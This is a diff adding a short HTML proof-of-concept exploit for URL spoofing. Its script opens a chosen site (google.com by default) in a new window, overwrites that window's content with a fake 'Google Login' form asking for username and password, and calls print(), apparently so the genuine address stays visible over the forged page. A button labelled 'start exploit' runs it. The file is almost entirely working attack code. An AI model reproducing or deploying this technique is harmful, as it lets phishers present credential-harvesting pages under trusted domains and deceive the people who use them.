@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+	<script>
+	function spoofUrl(url)
+	{
+	var poc = window.open(url,'_blank');
+	window.focus();
+  poc.document.write('<html><head><link rel="shortcut icon" href="/favicon.png" type="image/png"><title>Google Login</title><head><body>	<div align="center"><h1> Log in to google </h1></br><form method="get" action="#">Username: <input type="text" name="uname" id="uname" value="" size="25" /><br />Password: <input type="password" name="upass" id="upass" value=""size="25" /><br /><p></form><button>Login</button></div></body></html>');
+	print();
+	}
+	function induceSploit(){
+		var target = document.getElementById("url").value;
+		spoofUrl(target);
+	}
+	</script>
+</head>
+<body>
+<form autocomplete="off" action="#" name="login" method="post">
+<input name="url" id="url" type="text" value="https://www.google.com">
+</form>
+<p>Click on button to start exploit</p>
+
+<button onclick="induceSploit()">start</button>
+
+</body>
+</html>
